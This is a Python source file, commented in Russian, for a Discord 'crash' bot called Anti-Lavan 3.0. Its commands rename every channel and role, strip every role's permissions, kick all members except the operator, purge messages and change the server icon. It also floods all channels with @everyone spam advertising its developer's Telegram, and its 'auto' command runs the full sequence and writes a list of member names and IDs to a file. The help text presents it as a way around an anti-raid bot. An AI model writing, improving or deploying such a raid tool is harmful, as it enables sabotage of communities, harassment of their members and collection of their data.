# -*- coding: utf8 -*-
                        
cl = """
   db           w   w      8                           
  dPYb   8d8b. w8ww w      8    .d88 Yb  dP .d88 8d8b. 
 dPwwYb  8P Y8  8   8 wwww 8    8  8  YbdP  8  8 8P Y8 
dP    Yb 8   8  Y8P 8      8888 `Y88   YP   `Y88 8   8
                                                          
                                                          """
print(cl)

updates = 'Anti-Lavan 3.0 (открытый исходный код)\n- Исправлена команда purge, она чистила только текущий канал, задумано было все\n- Теперь некоторые функции бота можно настроить\n- Изменен алгоритм краша\n- У бота теперь открытый исходный код!\n- Добавлены логи краша'

token = input('Token --> ')
prefix = input('Prefix --> ')
echo = input('Показать ли список изменений ( да / нет ) --> ')
while True:
    wh = input("Сколько раз циклить спам? (1 раз - 3 сообщения каждый канал) --> ")
    try:
        wh = int(wh)
        break
    except:
        print("Ошибка, либо вы написали не число, а например знаки или попробуйте еще раз")

if str(echo).lower() == 'да':
    print(updates + '\n')
else:
    pass

channelname = 'Crashed By Anti-Lavan'
rolename = 'Crashed By Anti-Lavan'
reasonb = 'Сервер крашнут ботом Anti-Lavan'

import discord
from discord import *
from discord.ext import commands
import asyncio
import time
from discord import Permissions

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help') # удаляем встроенную команду хелпа

@client.event
async def on_ready():
    print(f'[ LOG ] {client.user} запущен!')

@client.command()
async def rename_channels(ctx):
    for channel in ctx.guild.channels:
        oldname = channel.name
        try:
            await channel.edit(name=channelname)
        except:
            print(f'[ ERROR ] Не смог изменить имя каналу {oldname} на сервере {ctx.guild.name}')
        else:
            print(f'[ LOG ] #{oldname} --> #{channel.name}')

@client.command()
async def rename_roles(ctx):
    for role in ctx.guild.roles:
        oldrole = role.name
        try:
            await role.edit(name=rolename)
        except:
            print(f'[ ERROR ] Не смог изменить имя роли {oldrole} на сервере {ctx.guild.name}')
        else:
            print(f'[ LOG ] {oldrole} --> {role.name}')

@client.command()
async def deop_roles(ctx):
    perms = Permissions()
    count = 1
    perms.update(read_messages=False, ban_members=False, kick_members=False, send_messages=False, create_instant_invite=False, administrator=False, manage_channels=False, manage_guild=False, add_reactions=False, view_audit_log=False, priority_speaker=False, stream=False, view_channel=False, send_tts_messages=False, manage_messages=False, embed_links=False, attach_files=False, read_message_history=False, mention_everyone=False, external_emojis=False, use_external_emojis=False, view_guild_insights=False, connect=False, speak=False, mute_members=False, deafen_members=False, move_members=False, use_voice_activation=False, change_nickname=False, manage_nicknames=False, manage_roles=False, manage_permissions=False, manage_webhooks=False, manage_emojis=False, use_slash_commands=False, request_to_speak=False)
    for role in ctx.guild.roles:
        try:
            await role.edit(permissions=perms)
        except:
            print(f'[ ERROR ] Не изменил права роли {role.name}')
        else:
            print(f'[ LOG ] Изменил права у роли #{count}')
            count +=1

@client.command()
async def purge(ctx):
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=1000)
        except:
            print(f'[ ERROR ] Не очистил сообщения на сервере {ctx.guild.name} в канале {channel.name}')
        else:
            print(f'[ LOG ] Очистил 1000 сообщений в канале {channel.name} на сервере {ctx.guild.name}')

@client.command()
async def kick_all(ctx):
    for user in ctx.guild.members:
        if int(user.id) != int(ctx.message.author.id):
            try:
                await user.kick(reason=reasonb)
            except:
                print(f'[ ERROR ] Сервер {ctx.guild.name} | Не смог кикнуть участника {user.name}#{user.discriminator}')
            else:
                print(f'[ LOG ] Кикнул участника {user.name}#{user.discriminator}')

@client.command()
async def icon(ctx):
    with open('bebra.png', 'rb') as f:
        avatar = f.read()
        await ctx.guild.edit(icon=avatar)
    print(f'[ LOG ] Успешно изменил иконку серверу {ctx.guild.name}')

@client.command()
async def spam(ctx):
    ch = 1
    while ch <= wh:
        for channel in ctx.guild.text_channels:
            try:
                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
                print(f'[ LOG ] Отправил сообщения на сервер {ctx.guild.name} в канал #{channel.name}')
            except:
                print(f'[ ERROR ] Не отправил спам на сервер {ctx.guild.name} в канал #{channel.name}')
        ch += 1
    print(f'[ LOG ] Краш сервера {ctx.guild.name} окончен. Спасибо за использование Anti-Lavan-а!')
    return None

@client.command()
async def auto(ctx):
    print(f'[ LOG ] Сервер {ctx.guild.name} | Краш запущен')
    members_ntag = []
    members_id = []
    try:
        for member in ctx.guild.members:
            m_id = ctx.guild.get_member(member.id).id
            members_id.append(m_id)
            mem_inf = ctx.guild.get_member(member.id).name + "#" + ctx.guild.get_member(member.id).discriminator
            members_ntag.append(mem_inf)
            print(members_ntag)
        # if member.id != ctx.author.id:
        with open(f'crash-{ctx.guild.id}.txt', 'a+') as f:
            f.write(f'Список всех участников сервера {ctx.guild.id}:\n{members_ntag}:{members_id}\n(c) Anti-Lavan, 2021\n')

        print(f'[ LOG ] Сервер {ctx.guild.name} | Собрал всех участников сервера в файл crash-{ctx.guild.id}.txt')
    
    except:
        print(f"[ ERROR ] Не удалось собрать всех участников из сервера {ctx.guild.name}")

    try:
        with open('bebra.png', 'rb') as f:
            avatar = f.read()
            await ctx.guild.edit(icon=avatar)
        print(f'[ LOG ] Сервер {ctx.guild.name} | Изменена иконка серверу (имя нельзя)')
    except:
        print(f"[ ERROR ] Не удалось изменить иконку на сервере {ctx.guild.name}")

    print(f'[ LOG ] Сервер {ctx.guild.name} | Начинаю изменение названий каналов')

    for channel in ctx.guild.channels:
        oldname = channel.name
        try:
            await channel.edit(name=channelname)
        except:
            print(f'[ ERROR ] Не изменил название канала #{channel.name}')
        else:
            print(f'[ LOG ] #{oldname} --> #{channel.name}')

    print(f'[ LOG ] Сервер {ctx.guild.name} | Названия каналов изменены. Начинаю изменять названия ролей...')
    for role in ctx.guild.roles:
        oldrole = role.name
        try:
            await role.edit(name=rolename)
        except:
            print(f'[ ERROR ] Не изменил название роли {role.name}')
        else:
            print(f'[ LOG ] {oldrole} --> {role.name}')

    print(f'[ LOG ] Названия ролей изменены. Теперь у них забираю права...')

    perms = Permissions()
    count = 1
    perms.update(read_messages=False, ban_members=False, kick_members=False, send_messages=False, create_instant_invite=False, administrator=False, manage_channels=False, manage_guild=False, add_reactions=False, view_audit_log=False, priority_speaker=False, stream=False, view_channel=False, send_tts_messages=False, manage_messages=False, embed_links=False, attach_files=False, read_message_history=False, mention_everyone=False, external_emojis=False, use_external_emojis=False, view_guild_insights=False, connect=False, speak=False, mute_members=False, deafen_members=False, move_members=False, use_voice_activation=False, change_nickname=False, manage_nicknames=False, manage_roles=False, manage_permissions=False, manage_webhooks=False, manage_emojis=False, use_slash_commands=False, request_to_speak=False)
    for role in ctx.guild.roles:
        try:
            await role.edit(permissions=perms)
        except:
            print(f'[ ERROR ] Не изменил права роли {role.name}')
        else:
            print(f'[ LOG ] Изменил права у роли {role.name}\nВсего изменил права у ролей: {count}')
            count += 1

    print('[ LOG ] Всем ролям изменил права. Начинаю кик всех участников сервера.')
    for user in ctx.guild.members:
        if int(user.id) != int(ctx.message.author.id):
            try:
                await user.kick(reason=reasonb)
            except:
                print(f'[ ERROR ] Не смог кикнуть участника {user.name}#{user.discriminator}')
            else:
                print(f'[ LOG ] Кикнул участника {user.name}#{user.discriminator}')

    print('[ LOG ] Кикнул всех, кого мог. Последний этап краша - СПАМ ВО ВСЕ КАНАЛЫ запущен!')
    await spam(ctx)
    asyncio.create_task(spam(ctx))
    ch += 1
    # asyncio.create_task(spam(ctx))
    # asyncio.create_task(spam(ctx))
    # asyncio.create_task(spam(ctx))
    # asyncio.create_task(spam(ctx))
    # asyncio.create_task(spam(ctx))
    # asyncio.create_task(spam(ctx))
    # asyncio.create_task(spam(ctx))#почему то for i in range не работал, по этому так
    # asyncio.create_task(spam(ctx)) 

@client.command()
async def help(ctx):
    embed = discord.Embed(title='Список команд',
      description=f'Авто-краш сервера\n```py\n{ctx.prefix}auto```\nИзменить иконку сервера (название нельзя, лаван банит за это)\n```py\n{ctx.prefix}icon```\nПереименовать все каналы в "{channelname}"\n```py\n{ctx.prefix}rename_channels```\nКикнуть всех участников сервера\n```py\n{ctx.prefix}kick_all```\nПереименовать все роли в "{rolename}"\n```py\n{ctx.prefix}rename_roles```\nЗабирает все права у всех ролей\n```py\n{ctx.prefix}deop_roles```\nCпам во все каналы\n```py\n{ctx.prefix}spam```\nОчистить 1000 сообщений во всех каналах\n```py\n{ctx.prefix}purge```\n\n**Чтобы все функции работали корректно, перемести мою роль как можно выше (необязательно выше чем лавана)**',
      colour=(discord.Colour.from_rgb(106, 192, 245)))
    await ctx.send(embed=embed)

try: 
    client.run(token)	
except:	
    print('[ ERROR ] Ты ввёл неверный токен бота или не включил ему интенты!')	
    input()
